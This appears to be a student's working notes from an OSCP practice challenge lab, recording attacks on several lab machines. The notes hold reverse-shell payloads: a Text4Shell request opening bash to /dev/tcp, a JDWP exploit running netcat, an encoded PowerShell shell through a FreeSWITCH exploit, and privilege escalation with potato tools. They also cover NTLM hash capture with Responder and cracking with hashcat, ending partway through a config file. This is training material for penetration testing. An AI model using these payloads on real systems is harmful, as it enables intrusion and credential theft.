# Questions
This is the second of three dedicated OSCP Challenge Labs. It is composed of six OSCP machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP exam.

The challenge contains three machines that are connected via Active Directory, and three standalone machines that do not have any dependencies or intranet connections. All the standalone machines have a local.txt and a proof.txt, however the Active Directory set only has a proof.txt on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together, and the entire domain must be compromised to achieve any points for it at all.

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

# I would like to start with standalone Machine which is KIERO .149
sudo ./nmapAutomator.sh -H 192.168.246.149 -t All
[nmap-scan.md]

# Based on the scanning we found 21 22 80 port are active.
gobuster dir -u http://192.168.246.149 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
dirb http://192.168.246.149
# Nothing much can get

# Suddenly feel like to check snmp
snmp-check 192.168.246.149
# Some information feedback..
https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'

	
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 192.168.246.149 'nsExtendStatus."command9"' = createAndGo 'nsExtendCommand."command9"' = /bin/echo 'nsExtendArgs."command9"' = 'hello rio is here'



# BERLIN
# From the scanning found a port in 8080
dirb http://192.168.246.150:8080 /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
dirsearch http://192.168.246.150:8080
...
[21:15:19] 200 -   25B  - /search 
[21:15:10] 200 -  946B  - /favicon.ico  
http://192.168.246.150:8080/CHANGELOG
...
# Changelog Version 0.2 - Added Apache Commons Text 1.8 Dependency for String Interpolation Version 0.1 - Initial beta version based on Spring Boot Framework - Added basic search functionality
...
https://github.com/gustanini/CVE-2022-42889-Text4Shell-POC/tree/main
# Found the exploit code from Github
python3 text4shell.py -u 'http://192.168.246.150:8080/search?query=' -c 'whoami' -m 'rce'
Response status code: 200
Response body: {"query":"${script:javascript:java.lang.Runtime.getRuntime().exec('whoami')}","result":""}
# Since it return in code 200, lets create a payload in #!/bin/bash
http://192.168.246.150:8080/search?query=%24%7bscript%3ajavascript%3ajava.lang.Runtime.getRuntime().exec(%27%2fbin%2fbash%20-c%20bash%24IFS%249-i%3e%26%2fdev%2ftcp%2f192.168.45.209%2f8888%3c%261%27)%7d

dev@oscp:~$ cat local.txt
dev@oscp:/$ ss -tulpn
...
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*                                  
tcp   LISTEN 0      1          127.0.0.1:8000      0.0.0.0:*                                  
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                  
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:* 
...
# Reverse Proxy the port 8000 to KALI
./chisel-linux64 server -p 8899 --reverse 
dev@oscp:/tmp$ ./chisel-linux64 client 192.168.45.209:8899 R:8010:127.0.0.1:8000
# Tried nmap, http and NC both are unable return information, then from the BERLIN machine checked it is run under /opt/stats/App.java
dev@oscp:/$ ps aux | grep 8000
...
root         852  0.0  1.7 2528964 34580 ?       Ssl  12:33   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
...
# References
https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol
# It is a Java Debug Wire Protocol, lets try to exploit it..
https://github.com/hugsy/jdwp-shellifier
# KALI setup NC
rlwrap nc -lvnp 6666
python3 jdwp-shellifier.py -t 127.0.0.1 -p 8010 --cmd 'busybox nc 192.168.45.209 6001 -e bash'
...
[*] Go triggering the corresponding ServerSocket (e.g., 'nc ip 5000 -z')
...
# Triggered the ServerSocket with nc
nc 192.168.246.150 5000 -z
# Go to listerner
whoami
root
cd /root
cat proof.txt

# GUST
# Based on the port scan, we found 8021 is special
searchsploit freeswitch
searchsploit -m 47799

code freeswitch-exploit.py
python3 freeswitch-exploit.py 192.168.246.151 hostname
OSCP
[pwsh-revshell-encode.py]
python3 pwsh-revshell-encode.py
rlwrap nc -lvnp 8888
python3 freeswitch-exploit.py 192.168.246.151 "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQAxACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

PS C:\Program Files\FreeSWITCH> whoami
oscp\chris
PS C:\Program Files\FreeSWITCH> net user chris
# Just a normal user
PS C:\Program Files\FreeSWITCH> whoami /priv
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
...
PS C:\Users\chris\Desktop> type local.txt

# Good, upload printspoofer and NC to try
PS C:\Users\chris\Desktop> .\print.exe -c "C:\Users\chris\Desktop\nc.exe 192.168.45.191 8881 -e powershell"
# Failed or timed out, lets try GodPotato
PS C:\Users\chris\Desktop> ./potato.exe -cmd "cmd /c C:\Users\chris\Desktop\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.191 8881"
C:\Users\Administrator\Desktop>type proof.txt

# 147
# From the port scanning we knew that it is using 8080 port but when we access from HTTP it cannot be access, it was caused by the DNS resolve issue, then from 8443 we found the certficates name where we should use this DNS
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Subject Alternative Name: DNS:MS01.oscp.exam

sudo nano /etc/hosts
MS01.oscp.exam  192.168.246.147

# From the webform there is a URL support probably we can use responder to capture 
sudo responder -I tun0 -d -w
...
URL Textbox
smb://192.168.45.209/exploit
...
# in the end it is file://192.168.45.209/exploit ... 
# need to find out why... ***********
...
[SMB] NTLMv2-SSP Client   : 192.168.246.147
[SMB] NTLMv2-SSP Username : OSCP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::OSCP:edae8b3d2151faf0:6F57CAD0B5887543D8AD71CD923029A2:0101000000000000803C23E99DB7DA01A29100CD55CFD779000000000200080044004A004600520001001E00570049004E002D00340031004B00350047004500320043004F0032004F0004003400570049004E002D00340031004B00350047004500320043004F0032004F002E0044004A00460052002E004C004F00430041004C000300140044004A00460052002E004C004F00430041004C000500140044004A00460052002E004C004F00430041004C0007000800803C23E99DB7DA0106000400020000000800300030000000000000000000000000300000E78CD6853F7988BC7D4907BCCEEA4040924AB5D263BADCF1E235F21739BC8CEB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300039000000000000000000
...
## Space sensitive ye fuck
hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt --force
...
Diamond1
...
# Lets try impacket-psexec
impacket-psexec 'web_svc:Diamond1'@192.168.246.147
# Failed..
# Lets try port 22
ssh web_svc@192.168.246.147
password: Diamond1

# Upload winpeas
...
C:\Users\web_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
t
...
# ntg 
# Found a web.config file from inetpub
PS C:\inetpub\pportal> cat .\Web.config
```html
<?xml version="1.0" encoding="utf-8"?>                                           
<!--                                
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301880                                 
  -->         
<configuration>                                                     
  <appSettings> 
```

